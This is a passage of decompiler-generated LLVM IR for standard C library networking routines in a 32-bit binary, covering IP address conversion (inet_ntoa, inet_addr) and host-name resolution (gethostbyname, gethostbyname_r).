  %v4_805f16f = inttoptr i32 %v3_805f16f to i8*
  %v5_805f16f = load i8, i8* %v4_805f16f, align 1
  %v6_805f16f = and i8 %v5_805f16f, 8
  %v7_805f16f = icmp eq i8 %v6_805f16f, 0
  br i1 %v7_805f16f, label %dec_label_pc_805f1d8, label %dec_label_pc_805f176

dec_label_pc_805f176:                             ; preds = %dec_label_pc_805f166
  %v4_805f18a.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_805f18a

dec_label_pc_805f17a:                             ; preds = %dec_label_pc_805f18a
  %v3_805f17a = mul i32 %v1_805f17a, 10
  %v2_805f17d = add i32 %v3_805f17a, -48
  %v3_805f17d = add i32 %v2_805f17d, %v2_805f18c
  %v1_805f181 = add i32 %v3_805f17d, -255
  %v6_805f181 = sub i32 254, %v3_805f17d
  %v7_805f181 = and i32 %v6_805f181, %v3_805f17d
  %v8_805f181 = icmp slt i32 %v7_805f181, 0
  %v9_805f181 = icmp eq i32 %v1_805f181, 0
  %v10_805f181 = icmp slt i32 %v1_805f181, 0
  %v3_805f187 = icmp eq i1 %v10_805f181, %v8_805f181
  %v4_805f187 = icmp eq i1 %v9_805f181, false
  %v5_805f187 = and i1 %v4_805f187, %v3_805f187
  br i1 %v5_805f187, label %dec_label_pc_805f1d8, label %dec_label_pc_805f189

dec_label_pc_805f189:                             ; preds = %dec_label_pc_805f17a
  %v1_805f189 = add i32 %v0_805f189, 1
  store i32 %v1_805f189, i32* @ecx, align 4
  br label %dec_label_pc_805f18a

dec_label_pc_805f18a:                             ; preds = %dec_label_pc_805f176, %dec_label_pc_805f189
  %v1_805f17a = phi i32 [ 0, %dec_label_pc_805f176 ], [ %v3_805f17d, %dec_label_pc_805f189 ]
  %v4_805f18a = phi i32 [ %v4_805f18a.pre, %dec_label_pc_805f176 ], [ %v6_805f18a, %dec_label_pc_805f189 ]
  %v0_805f189 = phi i32 [ %v0_805f16c33, %dec_label_pc_805f176 ], [ %v1_805f189, %dec_label_pc_805f189 ]
  %v1_805f18a = inttoptr i32 %v0_805f189 to i8*
  %v2_805f18a = load i8, i8* %v1_805f18a, align 1
  %v3_805f18a = zext i8 %v2_805f18a to i32
  %v5_805f18a = and i32 %v4_805f18a, -256
  %v6_805f18a = or i32 %v3_805f18a, %v5_805f18a
  store i32 %v6_805f18a, i32* @edx, align 4
  %v2_805f18c = sext i8 %v2_805f18a to i32
  %v2_805f18f = mul nsw i32 %v2_805f18c, 2
  %v3_805f18f = add i32 %v2_805f18f, %v0_805f166.pre
  %v4_805f18f = inttoptr i32 %v3_805f18f to i16*
  %v5_805f18f = load i16, i16* %v4_805f18f, align 2
  %v2_805f194 = and i16 %v5_805f18f, 8
  %v3_805f194 = icmp eq i16 %v2_805f194, 0
  %v1_805f196 = icmp eq i1 %v3_805f194, false
  br i1 %v1_805f196, label %dec_label_pc_805f17a, label %dec_label_pc_805f198

dec_label_pc_805f198:                             ; preds = %dec_label_pc_805f18a
  %v8_805f198 = sub nsw i32 2, %v2_805f1af34
  %v9_805f198 = and i32 %v8_805f198, %v2_805f1af34
  %v10_805f198 = icmp slt i32 %v9_805f198, 0
  %v11_805f198 = icmp eq i32 %v2_805f1af34, 3
  %v12_805f198 = icmp slt i32 %v2_805f1af34, 3
  %v3_805f19c = icmp eq i1 %v12_805f198, %v10_805f198
  %v4_805f19c = icmp eq i1 %v11_805f198, false
  %v5_805f19c = and i1 %v4_805f19c, %v3_805f19c
  br i1 %v5_805f19c, label %dec_label_pc_805f1a6, label %dec_label_pc_805f19e

dec_label_pc_805f19e:                             ; preds = %dec_label_pc_805f198
  %v10_805f19e = icmp eq i8 %v2_805f18a, 46
  %v1_805f1a1 = icmp eq i1 %v10_805f19e, false
  br i1 %v1_805f1a1, label %dec_label_pc_805f1d8, label %dec_label_pc_805f1a3

dec_label_pc_805f1a3:                             ; preds = %dec_label_pc_805f19e
  %v1_805f1a3 = add i32 %v0_805f189, 1
  store i32 %v1_805f1a3, i32* @ecx, align 4
  br label %dec_label_pc_805f1af

dec_label_pc_805f1a6:                             ; preds = %dec_label_pc_805f198
  %v1_805f1a6 = add i32 %v0_805f189, 1
  store i32 %v1_805f1a6, i32* @ecx, align 4
  %v4_805f1a7 = icmp eq i8 %v2_805f18a, 0
  br i1 %v4_805f1a7, label %dec_label_pc_805f1af, label %dec_label_pc_805f1ab

dec_label_pc_805f1ab:                             ; preds = %dec_label_pc_805f1a6
  %v2_805f1ab = and i16 %v5_805f18f, 32
  %v3_805f1ab = icmp eq i16 %v2_805f1ab, 0
  br i1 %v3_805f1ab, label %dec_label_pc_805f1d8, label %dec_label_pc_805f1af

dec_label_pc_805f1af:                             ; preds = %dec_label_pc_805f1ab, %dec_label_pc_805f1a6, %dec_label_pc_805f1a3
  %v0_805f16c3 = phi i32 [ %v1_805f1a6, %dec_label_pc_805f1ab ], [ %v1_805f1a6, %dec_label_pc_805f1a6 ], [ %v1_805f1a3, %dec_label_pc_805f1a3 ]
  %v3_805f1af = add nuw nsw i32 %v2_805f1af34, 1
  %v2_805f1b2 = mul i32 %v0_805f1cd32, 256
  %v2_805f1b5 = or i32 %v1_805f17a, %v2_805f1b2
  %v7_805f1bb = icmp sgt i32 %v2_805f1af34, 3
  br i1 %v7_805f1bb, label %dec_label_pc_805f1bd, label %dec_label_pc_805f166

dec_label_pc_805f1bd:                             ; preds = %dec_label_pc_805f1af
  %v4_805f1bd = icmp eq i32 %arg2, 0
  br i1 %v4_805f1bd, label %dec_label_pc_805f1da, label %dec_label_pc_805f1c9

dec_label_pc_805f1c9:                             ; preds = %dec_label_pc_805f1bd
  %v1_805f1cd = call i32 @llvm.bswap.i32(i32 %v2_805f1b5)
  %v2_805f1cf = inttoptr i32 %arg2 to i32*
  store i32 %v1_805f1cd, i32* %v2_805f1cf, align 4
  br label %dec_label_pc_805f1da

dec_label_pc_805f1d8:                             ; preds = %dec_label_pc_805f1ab, %dec_label_pc_805f19e, %dec_label_pc_805f166, %dec_label_pc_805f17a, %entry
  br label %dec_label_pc_805f1da

dec_label_pc_805f1da:                             ; preds = %dec_label_pc_805f1bd, %dec_label_pc_805f1c9, %dec_label_pc_805f1d8
  %v0_805f1df = phi i32 [ 1, %dec_label_pc_805f1bd ], [ 1, %dec_label_pc_805f1c9 ], [ 0, %dec_label_pc_805f1d8 ]
  ret i32 %v0_805f1df

; uselistorder directives
  uselistorder i32 %v2_805f18c, { 1, 0 }
  uselistorder i32 %v6_805f18a, { 1, 0 }
  uselistorder i8 %v2_805f18a, { 1, 0, 2, 3 }
  uselistorder i32 %v0_805f189, { 0, 1, 3, 2 }
  uselistorder i32 %v1_805f181, { 1, 0 }
  uselistorder i32 %v3_805f17d, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805f16c33, { 1, 0 }
  uselistorder i32 %v2_805f1af34, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 -255, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_805f1da, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805f1d8, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_805f18a, { 1, 0 }
  uselistorder label %dec_label_pc_805f166, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805f1e0 = load i32, i32* @edi, align 4
  store i32 0, i32* @edi, align 4
  %v0_805f1e3 = load i32, i32* @esi, align 4
  store i32 0, i32* @esi, align 4
  %v0_805f1e6 = load i32, i32* @ebx, align 4
  store i32 %v0_805f1e6, i32* %stack_var_-12, align 4
  %v1_805f1ef = call i32 @llvm.bswap.i32(i32 %arg1)
  %sext = mul i32 %v1_805f1ef, 16777216
  %v1_805f1f1 = sdiv i32 %sext, 16777216
  store i32 %v1_805f1f1, i32* @ebx, align 4
  %v1_805f1f3 = add i32 %arg2, 15
  store i32 %v1_805f1f3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805f1f8

dec_label_pc_805f1f8:                             ; preds = %entry, %dec_label_pc_805f21d
  %v0_805f1ff17 = phi i32 [ %v1_805f1f1, %entry ], [ %v2_805f21d, %dec_label_pc_805f21d ]
  %v0_805f22916 = phi i32 [ %v1_805f1f3, %entry ], [ %v0_805f221, %dec_label_pc_805f21d ]
  %v1_805f203 = urem i32 %v0_805f1ff17, 256
  %v5_805f20b = inttoptr i32 %v0_805f22916 to i8*
  %v6_805f20b = call i32 @_uintmaxtostr(i8* %v5_805f20b, i32 %v1_805f203, i32 0, i32 -10, i32 0)
  %v0_805f213 = load i32, i32* @esi, align 4
  %v1_805f213 = icmp eq i32 %v0_805f213, 0
  %v1_805f215 = add i32 %v6_805f20b, -1
  store i32 %v1_805f215, i32* %ecx.global-to-local, align 4
  br i1 %v1_805f213, label %dec_label_pc_805f21d, label %dec_label_pc_805f21a

dec_label_pc_805f21a:                             ; preds = %dec_label_pc_805f1f8
  %v1_805f21a = inttoptr i32 %v0_805f213 to i8*
  store i8 46, i8* %v1_805f21a, align 1
  %v0_805f221.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805f21d

dec_label_pc_805f21d:                             ; preds = %dec_label_pc_805f1f8, %dec_label_pc_805f21a
  %v0_805f221 = phi i32 [ %v1_805f215, %dec_label_pc_805f1f8 ], [ %v0_805f221.pre, %dec_label_pc_805f21a ]
  %v0_805f21d = load i32, i32* @ebx, align 4
  %v2_805f21d = udiv i32 %v0_805f21d, 256
  store i32 %v2_805f21d, i32* @ebx, align 4
  %v0_805f220 = load i32, i32* @edi, align 4
  %v1_805f220 = add i32 %v0_805f220, 1
  store i32 %v1_805f220, i32* @edi, align 4
  store i32 %v0_805f221, i32* @esi, align 4
  %v7_805f226 = icmp sgt i32 %v1_805f220, 3
  br i1 %v7_805f226, label %dec_label_pc_805f228, label %dec_label_pc_805f1f8

dec_label_pc_805f228:                             ; preds = %dec_label_pc_805f21d
  %v2_805f228 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805f228, i32* @ebx, align 4
  %v1_805f229 = add i32 %v0_805f221, 1
  store i32 %v0_805f1e3, i32* @esi, align 4
  store i32 %v0_805f1e0, i32* @edi, align 4
  ret i32 %v1_805f229

; uselistorder directives
  uselistorder i32 %v0_805f221, { 0, 2, 1 }
  uselistorder i32 %v1_805f1f1, { 1, 0 }
  uselistorder label %dec_label_pc_805f21d, { 1, 0 }
  uselistorder label %dec_label_pc_805f1f8, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  %v2_805f23b = call i32 @__GI_inet_ntoa_r(i32 %arg1, i32 ptrtoint (i32* @global_var_807dd04.671 to i32))
  ret i32 %v2_805f23b
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v2_805f247 = ptrtoint i32* %stack_var_-4 to i32
  %v2_805f250 = inttoptr i32 %arg1 to i8*
  %v3_805f250 = call i32 @inet_aton(i8* %v2_805f250, i32 %v2_805f247)
  store i32 -1, i32* @edx, align 4
  %v1_805f25b = icmp eq i32 %v3_805f250, 0
  br i1 %v1_805f25b, label %dec_label_pc_805f263, label %dec_label_pc_805f25f

dec_label_pc_805f25f:                             ; preds = %entry
  %v3_805f25f = load i32, i32* %stack_var_-4, align 4
  store i32 %v3_805f25f, i32* @edx, align 4
  br label %dec_label_pc_805f263

dec_label_pc_805f263:                             ; preds = %entry, %dec_label_pc_805f25f
  %v0_805f263 = phi i32 [ -1, %entry ], [ %v3_805f25f, %dec_label_pc_805f25f ]
  ret i32 %v0_805f263

; uselistorder directives
  uselistorder label %dec_label_pc_805f263, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805f26f = call i32 @__GI___h_errno_location()
  %v0_805f274 = load i32, i32* @edx, align 4
  %v2_805f277 = ptrtoint i32* %stack_var_-4 to i32
  %v8_805f28f = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_807deec.673, i32 ptrtoint (i32* @global_var_807dd20.672 to i32), i32 460, i32 %v2_805f277, i32 %v0_805f26f, i32 %v0_805f274)
  %v3_805f294 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v3_805f294
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i64 @__decompiler_undefined_function_4()
  %tmp18 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %v0_805f29c = load i32, i32* @ebp, align 4
  %v0_805f29d = load i32, i32* @edi, align 4
  %v0_805f29e = load i32, i32* @esi, align 4
  %v0_805f29f = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* @ebp, align 4
  store i32 %arg4, i32* @ebx, align 4
  %v1_805f2af = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v1_805f2af, align 4
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_805f2ba = icmp eq i32 %arg1, 0
  br i1 %v4_805f2ba, label %dec_label_pc_805f5c6, label %dec_label_pc_805f2c5

dec_label_pc_805f2c5:                             ; preds = %entry
  %v1_805f2c5 = call i32 @__errno_location(i32 %v0_805f29f)
  store i32 %v1_805f2c5, i32* %eax.global-to-local, align 4
  %v1_805f2ca = inttoptr i32 %v1_805f2c5 to i32*
  %v2_805f2ca = load i32, i32* %v1_805f2ca, align 4
  store i32 %v2_805f2ca, i32* @edi, align 4
  store i32 %v1_805f2c5, i32* @esi, align 4
  store i32 0, i32* %v1_805f2ca, align 4
  %v0_805f2dd = load i32, i32* @ebx, align 4
  store i32 %v0_805f2dd, i32* %stack_var_-108, align 4
  %v7_805f2e9 = call i32 @__get_hosts_byname_r(i32 %arg1, i32 2, i32 %tmp18, i32 %v0_805f2dd, i32 %arg5, i32 %arg6, i32 %v1_805f2c5)
  store i32 %v7_805f2e9, i32* %eax.global-to-local, align 4
  %v1_805f2f1 = icmp eq i32 %v7_805f2e9, 0
  br i1 %v1_805f2f1, label %dec_label_pc_805f5c6, label %dec_label_pc_805f2f9

dec_label_pc_805f2f9:                             ; preds = %dec_label_pc_805f2c5
  store i32 %arg6, i32* @ecx, align 4
  %v1_805f2fd = inttoptr i32 %arg6 to i32*
  %v2_805f2fd = load i32, i32* %v1_805f2fd, align 4
  store i32 %v2_805f2fd, i32* %edx.global-to-local, align 4
  %v9_805f2ff = icmp eq i32 %v2_805f2fd, 1
  br i1 %v9_805f2ff, label %dec_label_pc_805f319, label %dec_label_pc_805f304

dec_label_pc_805f304:                             ; preds = %dec_label_pc_805f2f9
  %v9_805f304 = icmp eq i32 %v2_805f2fd, 4
  br i1 %v9_805f304, label %dec_label_pc_805f319, label %dec_label_pc_805f309

dec_label_pc_805f309:                             ; preds = %dec_label_pc_805f304
  %v1_805f309 = add i32 %v2_805f2fd, 1
  %v8_805f309 = icmp eq i32 %v1_805f309, 0
  store i32 %v1_805f309, i32* %edx.global-to-local, align 4
  %v1_805f30a = icmp eq i1 %v8_805f309, false
  br i1 %v1_805f30a, label %dec_label_pc_805f5c6, label %dec_label_pc_805f310

dec_label_pc_805f310:                             ; preds = %dec_label_pc_805f309
  %v0_805f310 = load i32, i32* @esi, align 4
  %v1_805f310 = inttoptr i32 %v0_805f310 to i32*
  %v2_805f310 = load i32, i32* %v1_805f310, align 4
  %v11_805f310 = icmp eq i32 %v2_805f310, 2
  %v1_805f313 = icmp eq i1 %v11_805f310, false
  br i1 %v1_805f313, label %dec_label_pc_805f5c6, label %dec_label_pc_805f319

dec_label_pc_805f319:                             ; preds = %dec_label_pc_805f310, %dec_label_pc_805f304, %dec_label_pc_805f2f9
  %v0_805f319 = load i32, i32* @ebp, align 4
  %v1_805f31b = sub i32 0, %v0_805f319
  %v1_805f31d = urem i32 %v1_805f31b, 4
  %v2_805f31d = icmp eq i32 %v1_805f31d, 0
  store i32 %v1_805f31d, i32* %eax.global-to-local, align 4
  %v0_805f320 = load i32, i32* @edi, align 4
  %v1_805f320 = load i32, i32* @esi, align 4
  %v2_805f320 = inttoptr i32 %v1_805f320 to i32*
  store i32 %v0_805f320, i32* %v2_805f320, align 4
  %v0_805f334.pre = load i32, i32* @ebx, align 4
  br i1 %v2_805f31d, label %dec_label_pc_805f330, label %dec_label_pc_805f324

dec_label_pc_805f324:                             ; preds = %dec_label_pc_805f319
  %v1_805f324 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f324 = sub i32 %v0_805f334.pre, %v1_805f324
  %v7_805f324 = icmp ult i32 %v0_805f334.pre, %v1_805f324
  br i1 %v7_805f324, label %dec_label_pc_805f5c1, label %dec_label_pc_805f32c

dec_label_pc_805f32c:                             ; preds = %dec_label_pc_805f324
  %v0_805f32c = load i32, i32* @ebp, align 4
  %v2_805f32c = add i32 %v0_805f32c, %v1_805f324
  store i32 %v2_805f32c, i32* @ebp, align 4
  store i32 %v2_805f324, i32* @ebx, align 4
  br label %dec_label_pc_805f330

dec_label_pc_805f330:                             ; preds = %dec_label_pc_805f319, %dec_label_pc_805f32c
  %v0_805f334 = phi i32 [ %v2_805f324, %dec_label_pc_805f32c ], [ %v0_805f334.pre, %dec_label_pc_805f319 ]
  store i32 %arg6, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %v1_805f2fd, align 4
  %tmp41 = icmp ult i32 %v0_805f334, 4
  br i1 %tmp41, label %dec_label_pc_805f5c1, label %dec_label_pc_805f343

dec_label_pc_805f343:                             ; preds = %dec_label_pc_805f330
  %v0_805f343 = load i32, i32* @ebx, align 4
  %v1_805f343 = add i32 %v0_805f343, -4
  store i32 %v1_805f343, i32* %eax.global-to-local, align 4
  %tmp42 = icmp ult i32 %v1_805f343, 8
  br i1 %tmp42, label %dec_label_pc_805f5c1, label %dec_label_pc_805f34f

dec_label_pc_805f34f:                             ; preds = %dec_label_pc_805f343
  %v1_805f34f = add i32 %v0_805f343, -12
  store i32 %v1_805f34f, i32* %eax.global-to-local, align 4
  %v0_805f352 = load i32, i32* @ebp, align 4
  %v1_805f352 = add i32 %v0_805f352, 4
  store i32 %v1_805f352, i32* %edx.global-to-local, align 4
  store i32 %v1_805f352, i32* %stack_var_-92, align 4
  %v3_805f35b = inttoptr i32 %v1_805f352 to i32*
  store i32 %v0_805f352, i32* %v3_805f35b, align 4
  %v0_805f35e = load i32, i32* %edx.global-to-local, align 4
  %v1_805f35e = add i32 %v0_805f35e, 4
  %v2_805f35e = inttoptr i32 %v1_805f35e to i32*
  store i32 0, i32* %v2_805f35e, align 4
  %tmp43 = icmp ult i32 %v1_805f34f, 32
  br i1 %tmp43, label %dec_label_pc_805f5c1, label %dec_label_pc_805f36b

dec_label_pc_805f36b:                             ; preds = %dec_label_pc_805f34f
  %v0_805f36b = load i32, i32* @ebx, align 4
  %v1_805f36b = add i32 %v0_805f36b, -44
  store i32 %v1_805f36b, i32* @ebx, align 4
  %tmp44 = icmp ult i32 %v1_805f36b, 256
  br i1 %tmp44, label %dec_label_pc_805f5c1, label %dec_label_pc_805f37e

dec_label_pc_805f37e:                             ; preds = %dec_label_pc_805f36b
  %v0_805f37e = load i32, i32* @ebp, align 4
  %v1_805f37e = add i32 %v0_805f37e, 12
  %v1_805f385 = add i32 %v0_805f37e, 44
  store i32 %v1_805f385, i32* @edi, align 4
  store i32 %v1_805f385, i32* %stack_var_-108, align 4
  %v3_805f392 = inttoptr i32 %v1_805f385 to i8*
  %v4_805f392 = call i32 @strncpy(i8* %v3_805f392, i32 %arg1, i32 %v1_805f36b)
  %v0_805f397 = load i32, i32* @edi, align 4
  %v1_805f397 = load i32, i32* @ebp, align 4
  %v2_805f397 = add i32 %v1_805f397, 12
  %v3_805f397 = inttoptr i32 %v2_805f397 to i32*
  store i32 %v0_805f397, i32* %v3_805f397, align 4
  %v1_805f39e = add i32 %v0_805f37e, 16
  %v2_805f39e = inttoptr i32 %v1_805f39e to i32*
  store i32 0, i32* %v2_805f39e, align 4
  %v2_805f3a5 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805f3a5, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v0_805f3a7 = load i32, i32* @ebp, align 4
  store i32 %arg1, i32* %stack_var_-108, align 4
  %v2_805f3ac = inttoptr i32 %arg1 to i8*
  %v3_805f3ac = call i32 @inet_aton(i8* %v2_805f3ac, i32 %v0_805f3a7)
  store i32 %v3_805f3ac, i32* %eax.global-to-local, align 4
  %v1_805f3b4 = icmp eq i32 %v3_805f3ac, 0
  br i1 %v1_805f3b4, label %dec_label_pc_805f3f0, label %dec_label_pc_805f3b8

dec_label_pc_805f3b8:                             ; preds = %dec_label_pc_805f37e
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  %v0_805f3bc = load i32, i32* @edi, align 4
  store i32 %v0_805f3bc, i32* %arg2, align 4
  %v1_805f3be = add i32 %tmp18, 8
  %v2_805f3be = inttoptr i32 %v1_805f3be to i32*
  store i32 2, i32* %v2_805f3be, align 4
  %v0_805f3c5 = load i32, i32* %edx.global-to-local, align 4
  %v1_805f3c5 = add i32 %v0_805f3c5, 12
  %v2_805f3c5 = inttoptr i32 %v1_805f3c5 to i32*
  store i32 4, i32* %v2_805f3c5, align 4
  %v2_805f3cc = load i32, i32* %stack_var_-92, align 4
  %v1_805f3cf = load i32, i32* %edx.global-to-local, align 4
  %v2_805f3cf = add i32 %v1_805f3cf, 16
  %v3_805f3cf = inttoptr i32 %v2_805f3cf to i32*
  store i32 %v2_805f3cc, i32* %v3_805f3cf, align 4
  %v1_805f3d6 = load i32, i32* %edx.global-to-local, align 4
  %v2_805f3d6 = add i32 %v1_805f3d6, 4
  %v3_805f3d6 = inttoptr i32 %v2_805f3d6 to i32*
  store i32 %v1_805f37e, i32* %v3_805f3d6, align 4
  store i32 %arg5, i32* @ecx, align 4
  %v0_805f3dd = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805f3dd, i32* %v1_805f2af, align 4
  store i32 0, i32* %v1_805f2fd, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f5c6

dec_label_pc_805f3f0:                             ; preds = %dec_label_pc_805f37e
  %v0_805f3f0 = load i32, i32* %stack_var_-108, align 4
  %v3_805f3f0 = call i32 @__open_nameservers(i32 %v0_805f3f0, i32 %v0_805f3a7, i32 %v1_805f36b)
  store i32 %v3_805f3f0, i32* %eax.global-to-local, align 4
  %v2_805f400 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_805f400, i32* @ebx, align 4
  store i32 %v2_805f400, i32* %stack_var_-108, align 4
  %v4_805f405 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-36, i32 134589241, i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  store i32 %v4_805f405, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8075680.674 to i32), i32* %stack_var_-108, align 4
  %v1_805f411 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8075680.674 to i32))
  %v2_805f41c = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805f41c, i32* @ecx, align 4
  store i32 134589241, i32* %eax.global-to-local, align 4
  store i32 %v2_805f400, i32* %stack_var_-108, align 4
  %v3_805f421 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-36, i32 1)
  store i32 1, i32* %edx.global-to-local, align 4
  %v2_805f43c = ptrtoint i32* %stack_var_-76 to i32
  %v2_805f441 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805f441, i32* %eax.global-to-local, align 4
  store i32 %v2_805f441, i32* %stack_var_-108, align 4
  %v0_805f44b = load i32, i32* @esi, align 4
  %v7_805f452 = call i32 @__dns_lookup(i8* %v2_805f3ac, i32 1, i32 %v0_805f44b, i32 ptrtoint (i32* @global_var_807f834.676 to i32), i32 %v2_805f441, i32 %v2_805f43c)
  store i32 %v7_805f452, i32* %eax.global-to-local, align 4
  %v2_805f45a = icmp slt i32 %v7_805f452, 0
  %v1_805f45c = icmp eq i1 %v2_805f45a, false
  br i1 %v1_805f45c, label %dec_label_pc_805f472, label %dec_label_pc_805f45e

dec_label_pc_805f45e:                             ; preds = %dec_label_pc_805f3f0
  store i32 %arg6, i32* @ecx, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %v1_805f2fd, align 4
  br label %dec_label_pc_805f5c6

dec_label_pc_805f472:                             ; preds = %dec_label_pc_805f3f0
  %v4_805f472 = trunc i64 %tmp11 to i32
  store i32 %v4_805f472, i32* @ecx, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v10_805f485 = icmp ugt i32 %v1_805f36b, 256
  %v15_805f485 = icmp eq i32 %v0_805f36b, 300
  %v2_805f489 = or i1 %v10_805f485, %v15_805f485
  br i1 %v2_805f489, label %dec_label_pc_805f524, label %dec_label_pc_805f48b

dec_label_pc_805f48b:                             ; preds = %dec_label_pc_805f472
  %v3_805f48e = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805f48e, i32* %stack_var_-108, align 4
  %v1_805f492 = call i32 @free(i32 %v3_805f48e)
  store i32 %v1_805f492, i32* %eax.global-to-local, align 4
  %v2_805f497 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805f497, i32* @edi, align 4
  %v3_805f498 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f498, i32* %stack_var_-108, align 4
  %v1_805f49c = call i32 @free(i32 %v3_805f498)
  store i32 -1, i32* %v1_805f2fd, align 4
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805f59c

dec_label_pc_805f524:                             ; preds = %dec_label_pc_805f472
  %v3_805f529.pre = load i32, i32* %stack_var_-76, align 4
  %v0_805f52d.pre = load i32, i32* @edi, align 4
  store i32 %v0_805f52d.pre, i32* %stack_var_-108, align 4
  %v3_805f52e = inttoptr i32 %v0_805f52d.pre to i8*
  %v4_805f52e = call i32 @strncpy(i8* %v3_805f52e, i32 %v3_805f529.pre, i32 %v1_805f36b)
  store i32 %v4_805f52e, i32* %eax.global-to-local, align 4
  %v2_805f533 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805f533, i32* @ecx, align 4
  %v3_805f534 = load i32, i32* %stack_var_-76, align 4
  store i32 %v3_805f534, i32* %stack_var_-108, align 4
  %v1_805f538 = call i32 @free(i32 %v3_805f534)
  store i32 %v1_805f538, i32* %eax.global-to-local, align 4
  %v12_805f540 = icmp eq i32 %tmp10, 1
  %v1_805f545 = icmp eq i1 %v12_805f540, false
  br i1 %v1_805f545, label %dec_label_pc_805f5a1, label %dec_label_pc_805f547

dec_label_pc_805f547:                             ; preds = %dec_label_pc_805f524
  %v0_805f547 = load i32, i32* @edx, align 4
  %v0_805f54e = load i32, i32* @ebp, align 4
  store i32 %v0_805f54e, i32* %stack_var_-108, align 4
  %v3_805f54f = inttoptr i32 %tmp to i16*
  %v4_805f54f = call i32 @memcpy(i16* %v3_805f54f, i32 4, i32 %v0_805f547)
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v0_805f558 = load i32, i32* @edi, align 4
  store i32 %v0_805f558, i32* %arg2, align 4
  %v1_805f55a = add i32 %tmp18, 8
  %v2_805f55a = inttoptr i32 %v1_805f55a to i32*
  store i32 2, i32* %v2_805f55a, align 4
  %v0_805f561 = load i32, i32* %eax.global-to-local, align 4
  %v1_805f561 = add i32 %v0_805f561, 12
  %v2_805f561 = inttoptr i32 %v1_805f561 to i32*
  store i32 4, i32* %v2_805f561, align 4
  %v3_805f568 = load i32, i32* %stack_var_-92, align 4
  store i32 %v3_805f568, i32* %edx.global-to-local, align 4
  %v1_805f56c = load i32, i32* %eax.global-to-local, align 4
  %v2_805f56c = add i32 %v1_805f56c, 16
  %v3_805f56c = inttoptr i32 %v2_805f56c to i32*
  store i32 %v3_805f568, i32* %v3_805f56c, align 4
  store i32 %v1_805f37e, i32* @ecx, align 4
  %v1_805f573 = load i32, i32* %eax.global-to-local, align 4
  %v2_805f573 = add i32 %v1_805f573, 4
  %v3_805f573 = inttoptr i32 %v2_805f573 to i32*
  store i32 %v1_805f37e, i32* %v3_805f573, align 4
  %v2_805f576 = load i32, i32* %stack_var_-108, align 4
  store i32 %v2_805f576, i32* %eax.global-to-local, align 4
  %v3_805f577 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f577, i32* %stack_var_-108, align 4
  %v1_805f57b = call i32 @free(i32 %v3_805f577)
  store i32 %tmp18, i32* %edx.global-to-local, align 4
  store i32 %tmp18, i32* %v1_805f2af, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* @ecx, align 4
  store i32 0, i32* %v1_805f2fd, align 4
  br label %dec_label_pc_805f59c

dec_label_pc_805f59c:                             ; preds = %dec_label_pc_805f5a1, %dec_label_pc_805f48b, %dec_label_pc_805f547
  br label %dec_label_pc_805f5c6

dec_label_pc_805f5a1:                             ; preds = %dec_label_pc_805f524
  %v3_805f5a4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805f5a4, i32* %stack_var_-108, align 4
